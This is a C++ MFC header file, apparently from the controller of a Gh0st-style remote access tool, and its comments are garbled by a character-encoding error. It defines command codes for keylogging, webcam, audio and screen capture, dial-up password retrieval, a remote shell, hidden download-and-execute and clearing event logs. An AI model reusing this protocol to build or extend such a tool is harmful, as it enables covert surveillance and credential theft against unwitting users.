
// stdafx.h : ��׼ϵͳ�����ļ��İ����ļ���
// ���Ǿ���ʹ�õ��������ĵ�
// �ض�����Ŀ�İ����ļ�

#pragma once

// ʹ��ѹ���㷨���㷨��Ҫ��clien��stdafx.hƥ��
#define USING_COMPRESS 1

// �Ƿ�ʹ��ZLIB
#define USING_ZLIB 1

#if !USING_ZLIB
// �Ƿ�ʹ��LZ4
#define USING_LZ4 1
#endif

#ifndef _SECURE_ATL
#define _SECURE_ATL 1
#endif

#ifndef VC_EXTRALEAN
#define VC_EXTRALEAN            // �� Windows ͷ���ų�����ʹ�õ�����
#endif

// �Ƴ��Ի�����MFC�ؼ���֧�֣���С��̬�������Ĵ�С
#define _AFX_NO_MFC_CONTROLS_IN_DIALOGS

// �رնԻ���ʱɾ���Ի���
#define CLOSE_DELETE_DLG 0

// ����ڴ�й©���谲װVLD��������ע�ʹ���
#include "vld.h"

#include "targetver.h"

#define _ATL_CSTRING_EXPLICIT_CONSTRUCTORS      // ĳЩ CString ���캯��������ʽ��

// �ر� MFC ��ĳЩ�����������ɷ��ĺ��Եľ�����Ϣ������
#define _AFX_ALL_WARNINGS

#include <afxwin.h>         // MFC ��������ͱ�׼���
#include <afxext.h>         // MFC ��չ

#include <afxdisp.h>        // MFC �Զ�����

#ifndef _AFX_NO_OLE_SUPPORT
#include <afxdtctl.h>           // MFC �� Internet Explorer 4 �����ؼ���֧��
#endif
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>             // MFC �� Windows �����ؼ���֧��
#endif // _AFX_NO_AFXCMN_SUPPORT

#include <afxcontrolbars.h>     // �������Ϳؼ����� MFC ֧��

enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������

	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�

	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

	COMMAND_AUDIO,					// ��������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	COMMAND_SERVICES,				// �������
	COMMAND_REGEDIT,
	COMMAND_TALK,					// ��ʱ��Ϣ��֤

	// ����˷����ı�ʶ
	TOKEN_AUTH = 100,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣

	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������


	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������

	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������

	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ
	TOKEN_SERVERLIST,               // �����б�
	COMMAND_SERVICELIST,            // ˢ�·����б�        
	COMMAND_SERVICECONFIG,          // ����˷����ı�ʶ
	TOKEN_TALK_START,				// ��ʱ��Ϣ��ʼ
	TOKEN_TALKCMPLT,				// ��ʱ��Ϣ���ط�
	TOKEN_REGEDIT   = 200,                 // ע���
	COMMAND_REG_FIND,           //ע��� �����ʶ
	TOKEN_REG_KEY,
	TOKEN_REG_PATH,
	COMMAND_BYE,					// ���ض��˳�
	SERVER_EXIT,					// ���ض��˳�
};


#define WM_USERTOONLINELIST    WM_USER + 3000
#define WM_OPENSCREENSPYDIALOG WM_USER + 3001
#define WM_OPENFILEMANAGERDIALOG      WM_USER + 3002
#define WM_OPENTALKDIALOG              WM_USER+3003
#define WM_OPENSHELLDIALOG             WM_USER+3004
#define WM_OPENSYSTEMDIALOG            WM_USER+3005
#define WM_OPENAUDIODIALOG             WM_USER+3006
#define WM_OPENSERVICESDIALOG          WM_USER+3007
#define WM_OPENREGISTERDIALOG          WM_USER+3008
#define WM_OPENWEBCAMDIALOG            WM_USER+3009

#define WM_USEROFFLINEMSG				WM_USER+3010

enum
{
	FILEMANAGER_DLG = 1,
	SCREENSPY_DLG,
	VIDEO_DLG,
	AUDIO_DLG,
	KEYBOARD_DLG,
	SYSTEM_DLG,
	SHELL_DLG,
	SERVICES_DLG,
	REGISTER_DLG,
	TALK_DLG,
	MONITOR_DLG
};


#ifdef _UNICODE
#if defined _M_IX86
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif
#endif


#include <assert.h>
#include <MMSystem.h>
#pragma comment(lib, "winmm.lib")

// �߾��ȵ�˯�ߺ���
#define Sleep_m(ms) { timeBeginPeriod(1); Sleep(ms); timeEndPeriod(1); }

// �Բ���n����������C�µȴ�T��(n�ǲ���������������1000)
#define WAIT_n(C, T, n) {assert(!(1000%(n)));int s=(1000*(T))/(n);do{Sleep(n);}while((C)&&(--s));}

// ������C����ʱ�ȴ�T��(����10ms)
#define WAIT(C, T) { timeBeginPeriod(1); WAIT_n(C, T, 10); timeEndPeriod(1); }

// ������C����ʱ�ȴ�T��(����1ms)
#define WAIT_1(C, T) { timeBeginPeriod(1); WAIT_n(C, T, 1); timeEndPeriod(1); }

// ���ܼ�ʱ�������㺯���ĺ�ʱ
class auto_tick
{
private:
	const char *func;
	int span;
	clock_t tick;
	__inline clock_t now() const { return clock(); }
	__inline int time() const { return now() - tick; }

public:
	auto_tick(const char *func_name, int th = 5) : func(func_name), span(th), tick(now()) { }
	~auto_tick() { stop(); }

	__inline void stop() {
		if (span != 0) { int s(this->time()); if (s > span)TRACE("[%s]ִ��ʱ��: [%d]ms.\n", func, s); span = 0; }
	}
};

#ifdef _DEBUG
// ���ܼ��㵱ǰ�����ĺ�ʱ����ʱ���ӡ
#define AUTO_TICK(thresh) auto_tick TICK(__FUNCTION__, thresh)
#define STOP_TICK TICK.stop()
#else
#define AUTO_TICK(thresh) 
#define STOP_TICK 
#endif
